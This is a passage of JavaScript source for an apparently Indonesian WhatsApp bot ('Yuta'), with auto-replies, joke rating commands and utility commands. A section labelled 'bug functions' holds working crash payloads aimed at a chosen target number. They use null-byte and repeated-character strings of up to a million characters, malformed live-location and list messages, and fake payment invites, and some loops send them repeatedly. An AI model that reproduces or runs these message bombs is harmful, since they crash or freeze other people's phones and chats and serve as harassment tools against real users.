        let XeonStikRep = fs.readFileSync('./YutaMedia/theme/sticker_reply/private.webp')
        Yuta.sendMessage(m.chat, { sticker: XeonStikRep }, { quoted: m })
        }
        

//theme txt
let setv = pickRandom(global.listv)

//autoreply
for (let BhosdikaXeon of VoiceNoteXeon) {
if (budy === BhosdikaXeon) {
let audiobuffy = fs.readFileSync(`./YutaMedia/audio/${BhosdikaXeon}.mp3`)
Yuta.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
}
}
for (let BhosdikaXeon of StickerXeon){
if (budy === BhosdikaXeon){
let stickerbuffy = fs.readFileSync(`./YutaMedia/sticker/${BhosdikaXeon}.webp`)
Yuta.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of ImageXeon){
if (budy === BhosdikaXeon){
let imagebuffy = fs.readFileSync(`./YutaMedia/image/${BhosdikaXeon}.jpg`)
Yuta.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of VideoXeon){
if (budy === BhosdikaXeon){
let videobuffy = fs.readFileSync(`./YutaMedia/video/${BhosdikaXeon}.mp4`)
Yuta.sendMessage(m.chat, { video: videobuffy }, { quoted: m })
}
}

const sendapk = (teks) => {
Yuta.sendMessage(m.chat, { document: teks, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
}
for (let BhosdikaXeon of ApkXeon) {
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./YutaMedia/apk/${BhosdikaXeon}.apk`)
sendapk(buffer)
}
}

const sendzip = (teks) => {
Yuta.sendMessage(m.chat, { document: teks, mimetype: 'application/zip'}, {quoted:m})
}
for (let BhosdikaXeon of ZipXeon) {
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./YutaMedia/zip/${BhosdikaXeon}.zip`)
sendzip(buffer)
}
}

const senddocu = (teks) => {
Yuta.sendMessage(m.chat, { document: teks, mimetype: 'application/pdf'}, {quoted:m})
}
for (let BhosdikaXeon of DocXeon) {
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./YutaMedia/doc/${BhosdikaXeon}.pdf`)
senddocu(buffer)
}
}

async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        )
        const result = {
            status: 200,
            author: `${ownername}`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}

// Response Addlist
if (m.isGroup && isAlreadyResponList(m.chat, body.toLowerCase(), db_respon_list)) {
var get_data_respon = getDataResponList(m.chat, body.toLowerCase(), db_respon_list)
if (get_data_respon.isImage === false) {
Yuta.sendMessage(m.chat, { text: sendResponList(m.chat, body.toLowerCase(), db_respon_list) }, {
quoted: m
})
} else {
Yuta.sendMessage(m.chat, { image: await getBuffer(get_data_respon.image_url), caption: get_data_respon.response }, {
quoted: m
})
} 
}

// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: m.mentionedJid }, {
    userJid: Yuta.user.id,
    quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, Yuta.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
    ...chatUpdate,
    messages: [proto.WebMessageInfo.fromObject(messages)],
    type: 'append'
}
Yuta.ev.emit('messages.upsert', msg)
} 

//======bug functions========\\
const force = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./69/xx1.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}

const force2 = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./69/xx1.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}

const oneclickxeon = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `🦄드림 가이 Xeon`
}
}
}

const sendReaction = async reactionContent => {
  Yuta.sendMessage(m.chat, {
    'react': {
      'text': reactionContent,
      'key': m.key
    }
  });
};

async function blackening(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "stickerMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
    "mimetype": "image/webp",
    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
    "fileLength": "10116",
    "mediaKeyTimestamp": "1715876003",
    "isAnimated": false,
    "stickerSentTs": "1715881084144",
    "isAvatar": false,
    "isAiSticker": false,
    "isLottie": false
  }
}), { userJid: target, quoted: kuwoted });
await Yuta.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function locationxeony(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await Yuta.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}

async function xeonkillpic(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "🦄드림 가이 Xeon",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://i.ibb.co/Wppj16p/YutaOkkotsu.jpg" } }, { upload: Yuta.waUploadToServer }))
      },
      body: {
        text: ""
      },
      footer: {
        text: "›          #🦄드림 가이 Xeon"
      },
      nativeFlowMessage: {
        messageParamsJson: " ".repeat(1000000)
      }
    }
}), { userJid: target, quoted: kuwoted });
await Yuta.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function aipong(target) {
await Yuta.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
}

async function sendPoll(jid, text, list) {
Yuta.relayMessage(jid, {
"pollCreationMessage": {
"name": text,
"options": list.map(v => { return { optionName: v } }),
"selectableOptionsCount": list.length
}
}, {})
}

async function listxeonfck(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "🦄드림 가이 Xeon"+" ".repeat(920000),
        'footerText': `🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon`,
        'description': `🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
            'title': 'anjay',
            'products': [
              { "productId": "4392524570816732" }
            ]
          }],
          'productListHeaderImage': {
            'productId': '4392524570816732',
            'jpegThumbnail': null
          },
          'businessOwnerJid': '0@s.whatsapp.net'
        }
      },
      'footer': 'puki',
      'contextInfo': {
        'expiration': 604800,
        'ephemeralSettingTimestamp': "1679959486",
        'entryPointConversionSource': "global_search_new_chat",
        'entryPointConversionApp': "whatsapp",
        'entryPointConversionDelaySeconds': 9,
        'disappearingMode': {
          'initiator': "INITIATED_BY_ME"
        }
      },
      'selectListType': 2,
      'product_header_info': {
        'product_header_info_id': 292928282928,
        'product_header_is_rejected': false
      }
    }), { userJid: target, quoted: oneclickxeon });
await Yuta.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

if (budy.startsWith('Assalamualaikum') || budy.startsWith('assalamualaikum') || budy.startsWith('Assalamualaikum wr. wb') || budy.startsWith('assalamualaikum wr. wb') || budy.startsWith('Assalamualaikum wr wb') || budy.startsWith('assalamualaikum wr wb') || budy.startsWith(`Assalamu'alaikum`)) {
    let caption = `*Waalaikummussalam warahmatullahi wabarokatuh*


_📚 Baca yang dibawah ya!_
"Orang yang mengucapkan salam seperti ini maka ia mendapatkan 30 pahala, kemudian, orang yang dihadapan atau mendengarnya membalas dengan kalimat yang sama yaitu “Wa'alaikum salam warahmatullahi wabarakatuh” atau ditambah dengan yang lain (waridhwaana). Artinya selain daripada do'a selamat juga meminta pada Allah SWT"
/`.trim()
    replygcyuta(`${caption}`)
}

if (budy === ('P') || budy === ('p') || budy === ('PP') || budy === ('pp') || budy === ('Pe') || budy === ('pe') || budy === ('Peh') || budy === ('peh')) {
 await Yuta.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
 replygcyuta(`\`pa pe pa pe pa pe minimal salam kek gapunya agama? ya😹\``)
}
//=========================================\\
//random
if (budy === (`tes`) || budy === (`TES`) || budy === (`Tes`) || budy === (`Bot`) || budy === (`bot`) || budy === (`BOT`) || budy === (`@6282172589188`)) {
  let muptime1;
  if (process.send) {
    process.send("uptime");
    muptime1 =
      (await new Promise((resolve) => {
        process.once("message", resolve);
        setTimeout(resolve, 1000);
      })) * 1000;
  }
  let muptime = clockString(muptime1);
let neww = performance.now()
let oldd = performance.now()
let tes1 = neww - oldd
tes1
await LoadingReact()
let testing = ` 〆 ʙᴏᴛ ᴏɴ ᴋᴏᴋ ${pushname}
 〆 sᴇʀᴠᴇʀ: ${runtime(os.uptime())}
 〆 ᴘᴀɴᴇʟ: ${muptime}
 〆 ʙᴏᴛ: ${runtime(process.uptime())}
 〆 ᴋᴇᴄᴇᴘᴀᴛᴀɴ: ${tes1}
 
ᴊᴀɴɢᴀɴ sᴘᴀᴍ ʏᴀᴋ ʙᴀɴɢ
`

let leo = {
  text: testing,
  contextInfo: {
      isForwarded: true,
     forwardingScore: 99999,
    externalAdReply: {
      showAdAttribution: true,
      title: botname,
      mediaType: 1,
      body: ownername,
      //previewType: "PHOTO",
      thumbnail: fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg'),
      renderLargerThumbnail: true,
      sourceUrl: linkch
   },
    forwardedNewsletterMessageInfo: {
     newsletterJid: saluran,
     serverMessageId: -1,
     newsletterName: `ᴘ ɪ ɴ ɢ - s ᴄ - ${botname}: ${oldd - neww}`,
    }
  }
};
await Yuta.sendMessage(m.chat, leo, { quoted: fnews });
}




if (budy === (`@6285752535878`)) {
replygcyuta(`Ngapain? Kamu Tag Owner Ku`)
}



if (budy.startsWith(`Kontol`) || budy.startsWith(`.kontol`) || budy.startsWith(`KONTOL`) || budy.startsWith(`.Kontol`) || budy.startsWith(`Ngentod`) || budy.startsWith(`Ngentod`) || budy.startsWith(`.ngentod`)) {
replygcyuta(`Apa Coba`)
}




if (budy.startsWith("Sodium")) {
let me = m.sender
let teks = `╔┈┈┈┈「 \`Sodium\` 」┈┈┈┈┈✧
╎╭─────────────────✧
╎│ ⫹⫺ \`Sodium 1.21\`
╎│ ❏ https://www.mediafire.com/file/h2wf6iy4gd3lmqx/mods1.21[Fery1940].zip/file*
╎├─────────────────✧
╎│ ⫹⫺ \`Sodium 1.20.1 / sodium patch\`
╎│ ❏ https://www.mediafire.com/file/oqkm28bgmpndjx0/sodium_sikreett.zip/file
╎├─────────────────✧
╎│ ⫹⫺ \`Sodium patch 1.21\`
╎│ ❏ https://www.mediafire.com/file/p9yb4vca0mwzdyj/sodiumpatcher-1.0.1.jar/file
╎╰─────────────────✧
╚┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈✧
`
Yuta.relayMessage(m.chat,  {
requestPaymentMessage : {
expiryTimestamp: 0,												
currencyCodeIso4217: 'Rp',
amount1000: 100000000000,
requestFrom: `${m.sender.split("@")[0]}@s.whatsapp.net`,
noteMessage: {
extendedTextMessage: {
text : teks,
contextInfo: {
mentionedJid: [m.sender],
externalAdreplygcyuta: {
showAdAttribution: true,
}
}
}
}
}
}, {quoted: fnews})
}

async function sendViewOnceMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    let messageContent = generateWAMessageFromContent(jid, {
      'viewOnceMessage': {
        'message': {
          'messageContextInfo': {
            'deviceListMetadata': {},
            'deviceListMetadataVersion': 2
          },
          'interactiveMessage': proto.Message.InteractiveMessage.create({
            'body': proto.Message.InteractiveMessage.Body.create({
              'text': ''
            }),
            'footer': proto.Message.InteractiveMessage.Footer.create({
              'text': ''
            }),
            'header': proto.Message.InteractiveMessage.Header.create({
              'title': '',
              'subtitle': '',
              'hasMediaAttachment': false
            }),
            'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
              'buttons': [{
                'name': "cta_url",
                'buttonParamsJson': "{\"display_text\":\"ྦྷ\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
              }],
              'messageParamsJson': "\0".repeat(100000)
            })
          })
        }
      }
    }, {});
    Yuta.relayMessage(jid, messageContent.message, {
      'messageId': messageContent.key.id
    });
  }
}

async function sendSystemCrashMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'interactiveMessage': {
          'header': {
            'title': '',
            'subtitle': " "
          },
          'body': {
            'text': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸"
          },
          'footer': {
            'text': 'xp'
          },
          'nativeFlowMessage': {
            'buttons': [{
              'name': 'cta_url',
              'buttonParamsJson': "{ display_text : 'S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸', url : , merchant_url :  }"
            }],
            'messageParamsJson': "\0".repeat(1000000)
          }
        }
      }
    }
  }), {
    'userJid': jid
  });
  await Yuta.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}
async function sendListMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'listMessage': {
      'title': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸" + "\0".repeat(920000),
      'footerText': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
      'description': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
      'buttonText': null,
      'listType': 2,
      'productListInfo': {
        'productSections': [{
          'title': "lol",
          'products': [{
            'productId': "4392524570816732"
          }]
        }],
        'productListHeaderImage': {
          'productId': "4392524570816732",
          'jpegThumbnail': null
        },
        'businessOwnerJid': "0@s.whatsapp.net"
      }
    },
    'footer': "lol",
    'contextInfo': {
      'expiration': 600000,
      'ephemeralSettingTimestamp': "1679959486",
      'entryPointConversionSource': "global_search_new_chat",
      'entryPointConversionApp': "whatsapp",
      'entryPointConversionDelaySeconds': 9,
      'disappearingMode': {
        'initiator': "INITIATED_BY_ME"
      }
    },
    'selectListType': 2,
    'product_header_info': {
      'product_header_info_id': 292928282928,
      'product_header_is_rejected': false
    }
  }), {
    'userJid': jid
  });
  
  await Yuta.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendLiveLocationMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'liveLocationMessage': {
          'degreesLatitude': 'p',
          'degreesLongitude': 'p',
          'caption': '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ'.repeat(50000),
          'sequenceNumber': '0',
          'jpegThumbnail': ''
        }
      }
    }
  }), {
    'userJid': jid
  });
  
  await Yuta.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendExtendedTextMessage(jid) {
  Yuta.relayMessage(jid, {
    'extendedTextMessage': {
      'text': '.',
      'contextInfo': {
        'stanzaId': jid,
        'participant': jid,
        'quotedMessage': {
          'conversation': '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ'.repeat(50000)
        },
        'disappearingMode': {
          'initiator': "CHANGED_IN_CHAT",
          'trigger': "CHAT_SETTING"
        }
      },
      'inviteLinkGroupTypeV2': "DEFAULT"
    }
  }, {
    'participant': {
      'jid': jid
    }
  }, {
    'messageId': null
  });
}
async function sendPaymentInvite(jid) {
  Yuta.relayMessage(jid, {
    'paymentInviteMessage': {
      'serviceType': "UPI",
      'expiryTimestamp': Date.now() + 86400000
    }
  }, {
    'participant': {
      'jid': jid
    }
  });
}

async function sendMultiplePaymentInvites(jid, count) {
  for (let i = 0; i < count; i++) {
    sendPaymentInvite(jid);
    sendExtendedTextMessage(jid);
    await sleep(500);
  }
}

async function sendVariousMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    sendListMessage(jid);
    sendLiveLocationMessage(jid);
    sendSystemCrashMessage(jid);
    await sleep(500);
  }
}

async function sendRepeatedMessages2(jid, count) {
  for (let i = 0; i < count; i++) {
    sendSystemCrashMessage(jid);
    sendSystemCrashMessage(jid);
    sendSystemCrashMessage(jid);
    await sleep(500);
  }
}

async function sendMixedMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    sendLiveLocationMessage(jid);
    sendListMessage(jid);
    await sleep(500);
  }
}

function sendMessageWithMentions(text, mentions = [], quoted = false) {
  if (quoted == null || quoted == undefined || quoted == false) {
    return Yuta.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  } else {
    return Yuta.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  }
}

const xbug2 = {
key: {
remoteJid: 'status@broadcast',
fromMe: false, 
participant: '0@s.whatsapp.net'
},
message: {
listResponseMessage: {
title: botname
}
}
}
//======end bug functions========\\

		switch(isCommand) {
			case 'gaycheck':
      case 'cutecheck':
        case 'lesbicheck':
          case 'lesbiancheck':
             case 'hornycheck':
                 case 'prettycheck':
                    case 'lovelycheck':
                      case 'uglycheck':
case 'handsomecheck':{
				if (!text) return replygcyuta(`Tag Someone, Example : ${prefix + command} @Xeon`)
					const gan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const teng = gan[Math.floor(Math.random() * gan.length)]
					let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `*${command}*\n\nName : ${q}\nAnswer : *${teng}%*`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg')}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😁\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: m.sender, 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
}
					break
case 'beautifulcheck':{
				if (!text) return replygcyuta(`Tag Someone, Example : ${prefix + command} @Xeon`)
					const can = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const tik = can[Math.floor(Math.random() * can.length)]
					let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `*${command}*\n\nName : ${q}\nAnswer : *${tik}%*`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg')}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😁\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
}
					break
					case 'charactercheck':{
					if (!text) return replygcyuta(`Tag Someone, Example : ${prefix + command} @Xeon`)
					const xeony =['Compassionate','Generous','Grumpy','Forgiving','Obedient','Good','Simp','Kind-Hearted','patient','UwU','top, anyway','Helpful']
					const taky = xeony[Math.floor(Math.random() * xeony.length)]
					let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Character Check : ${q}\nAnswer : *${taky}*`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg')}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😁 \",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
}
				     break
case 'gura':
case 'gurastick':{
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/gura')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await Yuta.sendImageAsSticker(m.chat, wifegerakx, m, { packname: global.packname, author: global.author, })

}
break
			case 'rentbot':
                replygcyuta(`Type ${prefix}owner and chat him`)
                break
			case "idgroup": case "idgc": case "groupid": {
if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
let getGroups = await Yuta.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `⬣ *GROUP LIST BELOW*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await Yuta.groupMetadata(x)
teks += `◉ Name : ${metadata2.subject}\n◉ ID : ${metadata2.id}\n◉ Member : ${metadata2.participants.length}\n\n────────────────────────\n\n`
}
replygcyuta(teks + `To Use Please Type Command ${prefix}pushcontact idgroup|teks\n\nBefore using, please first copy the group id above`)
}
break
			case 'repo': case 'repository': {
  try {
    const [, username, repoName] = botscript.match(/github\.com\/([^/]+)\/([^/]+)/)
    const response = await axios.get(`https://api.github.com/repos/${username}/${repoName}`)
    if (response.status === 200) {
      const repoData = response.data
      const formattedInfo = `
${themeemoji} Repository Name: ${repoData.name}
${themeemoji} Description: ${repoData.description}
${themeemoji} Owner: ${repoData.owner.login}
${themeemoji} Stars: ${repoData.stargazers_count}
${themeemoji} Forks: ${repoData.forks_count}
${themeemoji} URL: ${repoData.html_url}
     
 `.trim()
      await Yuta.relayMessage(m.chat,  {
        requestPaymentMessage: {
          currencyCodeIso4217: 'INR',
          amount1000: 69000,
          requestFrom: m.sender,
          noteMessage: {
          extendedTextMessage: {
          text: formattedInfo,
          contextInfo: {
          externalAdReply: {
          showAdAttribution: true
          }}}}}}, { quoted: m })
    } else {
      await replygcyuta(`Unable to fetch repository information`)
    }
  } catch (error) {
    console.error(error)
    await replygcyuta(`Repository currently not available `)
  }
}
break
			case 'myip':
            case 'ipbot':
                if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
                var http = require('http')
                http.get({
                    'host': 'api.ipify.org',
                    'port': 80,
                    'path': '/'
                }, function(resp) {
                    resp.on('data', function(ip) {
                        replygcyuta("🔎 My public IP address is: " + ip);
                    })
                })
            break
            case 'request': case 'reportbug': {
	if (!text) return replygcyuta(`Example : ${
        prefix + command
      } hi dev play command is not working`)
            textt = `*| REQUEST/BUG |*`
            teks1 = `\n\n*User* : @${
   m.sender.split("@")[0]
  }\n*Request/Bug* : ${text}`
            teks2 = `\n\n*Hii ${m.pushName},You request has been forwarded to my Owners*.\n*Please wait...*`
            for (let i of owner) {
                Yuta.sendMessage(i + "@s.whatsapp.net", {
                    text: textt + teks1,
                    mentions: [m.sender],
                }, {
                    quoted: m,
                })
            }
            Yuta.sendMessage(m.chat, {
                text: textt + teks2 + teks1,
                mentions: [m.sender],
            }, {
                quoted: m,
            })

        }
        break
			case 'gita-verse': case 'gita': case 'bhagavatgita': {
	try {
    // Extract the verse number from the command text.
    let verseNumber = m.text.split(' ')[1]
    if (!verseNumber || isNaN(verseNumber)) {
